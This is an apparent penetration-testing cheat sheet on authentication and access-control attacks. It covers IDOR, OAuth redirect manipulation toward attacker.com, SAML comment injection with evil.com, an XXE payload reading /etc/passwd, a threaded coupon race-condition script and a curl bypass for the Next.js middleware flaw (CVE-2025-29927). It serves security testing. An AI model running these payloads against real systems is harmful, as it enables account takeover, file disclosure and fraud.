# Authentication and Access Control Attacks

## IDOR (Insecure Direct Object Reference)

**When**: Object IDs in URLs or parameters are not validated against
the authenticated user's permissions.

```
# Sequential IDs
GET /api/user/1     → your profile
GET /api/user/2     → someone else's profile
GET /api/order/100  → your order
GET /api/order/101  → someone else's order

# UUIDs (not sequential but still predictable if leaked)
GET /api/file/a1b2c3d4-...

# Test: change IDs in URL, POST body, headers, JSON fields
```

## Forced Browsing

```
# Access admin endpoints directly (no authorization check)
/admin
/admin/users
/admin/settings
/internal/debug
/api/admin/config
```

## HTTP Verb Tampering

**When**: Authorization checks only apply to specific HTTP methods.

```
# If GET /admin is blocked, try:
POST /admin
PUT /admin
DELETE /admin
PATCH /admin
OPTIONS /admin
HEAD /admin
TRACE /admin
```

## Parameter Pollution

```
# If server checks role=user but processes last value:
POST /register
role=user&role=admin

# Or in JSON:
{"role": "user", "role": "admin"}
```

## Mass Assignment / Object Injection

**When**: Server binds all request parameters to an object.

```json
// Normal registration
{"username": "user", "password": "pass"}

// With mass assignment
{"username": "user", "password": "pass", "role": "admin", "isVerified": true}
```

## OAuth / OpenID Connect Attacks

### Redirect URI Manipulation

```
# If redirect_uri validation is weak:
?redirect_uri=https://attacker.com
?redirect_uri=https://legit.com@attacker.com
?redirect_uri=https://legit.com.attacker.com
?redirect_uri=https://legit.com%2F..%2F@attacker.com
```

### State Parameter CSRF

**When**: `state` parameter is missing or not validated.

```
# Attacker initiates OAuth flow, gets code
# Sends link with attacker's code to victim
# Victim's account gets linked to attacker's OAuth identity
```

### Token Theft via Referer

If the OAuth callback page links to external resources, the
authorization code/token may leak via Referer header.

### ID Token Manipulation (OIDC)

```json
// If ID token claims are used without verification:
{"sub": "admin_user_id", "email": "admin@example.com"}
```

## SAML Attacks

### Signature Wrapping

Move the signed assertion and add an unsigned malicious assertion
that the server processes instead of the signed one.

### Comment Injection

```xml
<!-- If SAML parser ignores comments differently than verifier -->
<NameID>admin<!-- -->@evil.com</NameID>
<!-- Verifier sees: admin@evil.com -->
<!-- App sees: admin -->
```

### XXE via SAML

SAML messages are XML — inject XXE if the parser is vulnerable:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<NameID>&xxe;</NameID>
```

## Session Management

### Session Fixation

```
# Set session ID before authentication
# Victim logs in, session ID stays the same
# Attacker uses the pre-set session ID to access victim's session
```

### Predictable Session IDs

Check for patterns: sequential (123, 124, 125), timestamp-based,
weak random (PHP `session_id()` with low entropy).

### Cookie Flags

| Missing Flag | Risk |
|---|---|
| `HttpOnly` | JavaScript can read cookies (XSS → cookie theft) |
| `Secure` | Cookie sent over HTTP (MITM) |
| `SameSite` | CSRF possible |
| `Path=/` | Cookie accessible to all paths |

## Password Reset Flaws

- Token in URL → leaked via Referer header
- Short/predictable reset tokens
- Token not invalidated after use
- Host header injection in reset email → attacker's domain
- Rate limiting bypass (change case, add spaces to email)

## Race Conditions

### Threading Approach
```python
# IN: url, params for the racy operation  OUT: at least one wins the race
import threading, requests
session = requests.Session()
session.get(login_url, ...)  # authenticate first

barrier = threading.Barrier(50)  # all threads start simultaneously
results = []

def race():
    barrier.wait()  # synchronize start
    r = session.post(url, data={"coupon": "DISCOUNT50"})
    results.append(r.status_code)

threads = [threading.Thread(target=race) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
print(f"Successes: {results.count(200)}")  # more than 1 = race won
```

### Single-Packet Attack (HTTP/2 or HTTP/1.1 last-byte sync)
**When**: Threading is too slow — server processes sequentially.
```python
# Send N requests in a single TCP connection using HTTP/2 multiplexing
# or HTTP/1.1 with chunked encoding, releasing the last byte simultaneously
# Tool: Burp Suite Turbo Intruder with race1.py template
# Or: use h2 library for HTTP/2 multiplexing
```

**Common targets**: coupon redemption (apply twice), balance transfer (double-spend), registration (duplicate accounts), voting (vote twice), file upload overwrite (TOCTOU on validation).

## Next.js Middleware Bypass (CVE-2025-29927)

**When**: Next.js app uses middleware for authentication/authorization.

**How**: Send a request with the `x-middleware-subrequest` header set
to the middleware's file path. This causes Next.js to skip middleware
execution entirely.

```bash
curl -H "x-middleware-subrequest: middleware" https://target/admin
```

Patched in Next.js 14.2.25 and 15.2.3.
